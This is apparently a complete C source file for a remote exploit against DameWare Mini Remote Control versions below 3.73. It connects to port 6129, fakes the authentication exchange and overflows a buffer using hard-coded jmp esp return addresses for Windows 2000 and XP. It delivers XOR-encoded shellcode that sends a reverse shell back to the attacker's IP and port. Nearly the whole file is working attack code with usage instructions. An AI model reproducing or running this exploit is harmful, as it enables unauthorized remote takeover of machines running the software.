/**************************************************************************************/
/*     [Crpt] DameWare Mini Remote Control < v3.73 remote exploit by kralor [Crpt]    */
/* -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -   -  */
/* 8/10 win2k successfully exploited in blind mode (lang & type [pro,srv,etc] unknown)*/
/* tested against dameware versions: v3.68  v3.72                                     */
/* In comments there's some information about offsets for jmp esp on diff OS.         */
/* I've fixed a problem in the shellc0de, when I check for kernel32.dll, on winXP it  */
/* is kernel32.dll, but on win2k it is KERNEL32.DLL (both in unicode format)          */
/* shellc0de is a bit long for this b0f, so ExitThread won't be called, but it is in  */
/* the shellcode.Some people reported me 3 different offsets for winXP pro, home, sp0 */
/* or sp1, so I don't know why it's different and I haven't XP at home I can't find   */
/* another better EIP for XP (hope this 3 offsets will be enough for XP).             */
/* greetz: MrNice,AnAc,TripaX & Decryptus for helping me to find the EIP values.      */
/*....................................................................................*/
/* informations: kralor[at]coromputer.net,www.coromputer.net,irc undernet #coromputer */
/**************************************************************************************/

#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment (lib,"ws2_32")

/*
0x717564B8   jmp esp in comctl32.dll
win2k fr adv srv sp2
win2k en adv srv sp3
win2k en adv srv sp4
win2k en srv     sp3
win2k fr pro     sp3
win2k en pro     sp4
*/

#define RET_XP_VAR0 "\x07\xD5\x36\x77"
#define RET_XP_VAR1 "\xC1\x1C\x35\x77" // these offsets has been reported by many people
#define RET_XP_VAR2 "\xC1\x1C\x39\x77"
#define RET_WIN2k   "\xB8\x64\x75\x71"

#define PORT 6129
#define SIZEOF 4096
#define WINUSER "h4x0r"
#define WINHOST "l33t_home"
#define USERPROFILE_NAME "script kiddie"
#define USERPROFILE_COMPANY "g33k solutions."
#define USERPROFILE_LICENSE "11111-OEM-0001111-11111"
#define USERPROFILE_DATE "12/24/03 00:00:00"
#define INTERFACE_IP "192.168.1.1,192.168.1.2"
#define WINDOMAIN "l33t_d0m41n"
#define CLIENT_VERSION "3.72.0.0"

int cnx(char *host)
{
	int sock;
	struct sockaddr_in yeah;
	struct hostent *she;

	sock=socket(AF_INET,SOCK_STREAM,0);
	if(!sock) {
		printf("error: unable to create socket\r\n");
		return 0;
		}
	yeah.sin_family=AF_INET; 
	yeah.sin_addr.s_addr=inet_addr(host); 
	yeah.sin_port=htons(PORT);

if((she=gethostbyname(host))!=NULL) { 
	memcpy((char *)&yeah.sin_addr,she->h_addr,she->h_length); 
	} else { 
	if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE) {
		printf("error: cannot resolve host\r\n");
		return 0;
		} 
	}
	printf("[+] Connecting to %-30s ...",host);
	if(connect(sock,(struct sockaddr*)&yeah,sizeof(yeah))!=0) {
		printf("error: connection refused\r\n");
		return 0;
		}
	printf("Done\r\n");
	return sock;
}

void set_sc(int os, char *rhost, int rport, char *shellc0de)
{
	unsigned int ip=0;
	unsigned short port=0;
	char *port_to_shell="",*ip1="";

	ip = inet_addr(rhost); ip1 = (char*)&ip;
	shellc0de[325]=ip1[0]^0x95;shellc0de[326]=ip1[1]^0x95;
	shellc0de[327]=ip1[2]^0x95; shellc0de[328]=ip1[3]^0x95;

	port = htons(rport);
	port_to_shell = (char *) &port;
	shellc0de[319]=port_to_shell[0]^0x95;
	shellc0de[320]=port_to_shell[1]^0x95;

	if(os==1) {
		shellc0de[167]=shellc0de[215]=(unsigned char)0xfe;
		shellc0de[345]=shellc0de[453]=(unsigned char)0xfe;
		}
	return;
}

int start_auth(int sock, char *rhost, int rport, int var)
{
	int size,i=4,os;
	char buffer[SIZEOF];
	char shellc0de[] =
        "\xeb\x02\xeb\x0f\x66\x81\xec\x04\x08\x8b\xec\x83\xec\x50\xe8\xef"
        "\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xba\x01\x80\x33\x95"
        "\x43\xe2\xfa\x7e\xfa\xa6\x4e\x26\xa5\xf1\x1e\x96\x1e\xd5\x99\x1e"
        "\xdd\x99\x1e\x54\x1e\xc9\xb1\x9d\x1e\xe5\xa5\x96\xe1\xb1\x91\xad"
        "\x8b\xe0\xdd\x1e\xd5\x8d\x1e\xcd\xa9\x96\x4d\x1e\xce\xed\x96\x4d"
        "\x1e\xe6\x89\x96\x65\xc3\x1e\xe6\xb1\x96\x65\xc3\x1e\xc6\xb5\x96"
        "\x45\x1e\xce\x8d\xde\x1e\xa1\x0f\x96\x65\x96\xe1\xb1\x81\x1e\xa3"
        "\xae\xe1\xb1\x8d\xe1\x93\xde\xb6\x4e\xe0\x7f\x56\xca\xa6\x5c\xf3"
        "\x1e\x99\xca\xca\x1e\xa9\x1a\x18\x91\x92\x56\x1e\x8d\x1e\x56\xae"
        "\x54\xe0\x34\x56\x16\x79\xd5\x1e\x79\x14\x79\xb5\x97\x95\x95\xfd"
        "\xec\xd0\xed\xd4\xff\x9f\xff\xde\xff\x95\x7d\xe3\x6a\x6a\x6a\xa6"
        "\x5c\x52\xd0\x69\xe2\xe6\xa7\xca\xf3\x52\xd0\x95\xa6\xa7\x1d\xd8"
        "\x97\x1e\x48\xf3\x16\x7e\x91\xc4\xc4\xc6\x6a\x45\x1c\xd0\x91\xfd"
        "\xe7\xf0\xe6\xe6\xff\x9f\xff\xde\xff\x95\x7d\xd3\x6a\x6a\x6a\x1e"
        "\xc8\x91\x1c\xc8\x12\x1c\xd0\x02\x52\xd0\x69\xc2\xc6\xd4\xc6\x52"
        "\xd0\x95\xfa\xf6\xfe\xf0\x52\xd0\x91\xe1\xd4\x95\x95\x1e\x58\xf3"
        "\x16\x7c\x91\xc4\xc6\x6a\x45\xa6\x4e\xc6\xc6\xc6\xc6\xff\x94\xff"
        "\x97\x6a\x45\x1c\xd0\x31\x52\xd0\x69\xf6\xfa\xfb\xfb\x52\xd0\x95"
        "\xf0\xf6\xe1\x95\x1e\x58\xf3\x16\x7c\x91\xc4\x6a\xe0\x12\x6a\xc0"
        "\x02\xa6\x4e\x26\x97\x1e\x40\xf3\x1c\x8f\x96\x46\xf3\x52\x97\x97"
        "\x0f\x96\x46\x52\x97\x55\x3d\x94\x94\xff\x85\xc0\x6a\xe0\x31\x6a"
        "\x45\xfd\xf0\xe6\xe6\xd4\xff\x9f\xff\xde\xff\x95\x7d\x51\x6b\x6a"
        "\x6a\xa6\x4e\x52\xd0\x39\xd1\x95\x95\x95\x1c\xc8\x25\x1c\xc8\x2d"
        "\x1c\xc8\x21\x1c\xc8\x29\x1c\xc8\x55\x1c\xc8\x51\x1c\xc8\x5d\x52"
        "\xd0\x4d\x94\x94\x95\x95\x1c\xc8\x49\x1c\xc8\x75\x1e\xd8\x31\x1c"
        "\xd8\x71\x1c\xd8\x7d\x1c\xd8\x79\x18\xd8\x65\xc4\x18\xd8\x39\xc4"
        "\xc6\xc6\xc6\xff\x94\xc6\xc6\xf3\x52\xd0\x69\xf6\xf8\xf3\x52\xd0"
        "\x6b\xf1\x95\x1d\xc8\x6a\x18\xc0\x69\xc7\xc6\x6a\x45\xfd\xed\xfc"
        "\xe1\xc1\xff\x94\xff\xde\xff\x95\x7d\xcd\x6b\x6a\x6a\x6a";

	size=recv(sock,buffer,SIZEOF,0);
	if(buffer[0]!=0x30||buffer[1]!=0x11) {
		printf("error: wrong data received\r\n");
		return -1;
		}
	buffer[28]=0x00;buffer[36]=0x01;
	send(sock,buffer,size,0);
	memset(buffer,0,SIZEOF);
	printf("[+] Gathering %-30s     ...","information");
	for(size=0;size<4096;size+=recv(sock,&buffer[size],SIZEOF,0));

	if(buffer[0]!=0x10||buffer[1]!=0x27) {
		printf("error: wrong data received\r\n");
		return -1;
	}
	printf("Done\r\n");
	printf("[i] Operating system : ");
	if(buffer[16]==0x28||buffer[17]==0x0a) {
	os=1;
	printf("WinXP");
	} else {
		printf("Win2000");
		os=0;
	}
	printf("\r\n[i] Service Pack     : %s\r\n",!buffer[37]?"0":&buffer[37]);
	printf("[+] Setting shellc0de for this %-15s   ...","version");
	set_sc(os,rhost,rport,shellc0de);
	
	memset(&buffer[2],0,SIZEOF-2);
	strcpy(&buffer[175],WINUSER);
	memset(&buffer[416],0x90,180);
	printf("Done\r\n");
if(os==0)
	memcpy(&buffer[516],RET_WIN2k,4);
else {
	if(var==0) {
	printf("[!] Using 0x7736d507 as ret addr\r\n");
	memcpy(&buffer[516],RET_XP_VAR0,4);
	} else {
		if(var==1) {
	memcpy(&buffer[516],RET_XP_VAR1,4);
	printf("[!] Using 0x77351cc1 as ret addr\r\n");
		} else {
	memcpy(&buffer[516],RET_XP_VAR2,4);
	printf("[!] Using 0x77391cc1 as ret addr\r\n");
		}
	}
}
	memcpy(&buffer[520],shellc0de,sizeof(shellc0de));
	strcpy(&buffer[1200],WINHOST);strcpy(&buffer[975],USERPROFILE_NAME);
	strcpy(&buffer[1295],USERPROFILE_COMPANY);strcpy(&buffer[1495],USERPROFILE_LICENSE);
	strcpy(&buffer[1755],USERPROFILE_DATE);strcpy(&buffer[2015],WINHOST);
	strcpy(&buffer[2275],INTERFACE_IP);strcpy(&buffer[2535],WINDOMAIN);
	strcpy(&buffer[2795],CLIENT_VERSION);

	printf("[+] Sending evil %-30s  ...","packet");
	send(sock,buffer,SIZEOF,0);
	memset(buffer,0,SIZEOF);
	size=recv(sock,buffer,SIZEOF,0);

	if(buffer[0]!=0x32||buffer[1]!=0x11) {
		printf("Patched\r\n");
		return -1;
	}
	printf("Done\r\n");
	printf("[i] Shell should be arrived at %s:%d\r\n",rhost,rport);
	return 0;
}

void banner(void)
{
	printf("\r\n  [Crpt] DameWare Mini Remote Control < v3.73 remote exploit by kralor [Crpt]\r\n");
	printf("\t\t  www.coromputer.net && undernet #coromputer\r\n\r\n");
	return;
}
void syntax(char *prog)
{
	printf("syntax: %s <host> <your_ip> <your_port> [winXP variant]\r\n",prog);
	printf("winXP variante:\r\n");
	printf("               0 will use 0x7736d507 as eip [found on many XPs][default]\r\n");
	printf("               1 will use 0x77351cc1 as eip [found on many XPs]\r\n");
	printf("               2 will use 0x77391cc1 as eip [found on one XP sp0]\r\n");
	return;
}
int main(int argc, char *argv[])
{
	WSADATA wsaData;
	int sock,var=0;

	banner();
	if(argc<4||argc>5) {
		syntax(argv[0]);
		return -1;
		}
if(argc==5) {
	var=atoi(argv[4]);
	if(var>2||var<0) {
		syntax(argv[0]);
		return -1;
		}
	}
if(WSAStartup(0x0101,&wsaData)!=0) {
	printf("error: unable to load winsock\r\n");
	return -1;
	}
	sock=cnx(argv[1]);
if(!sock)
	return -1;
	start_auth(sock,argv[2],atoi(argv[3]),var);
	return 0;
}
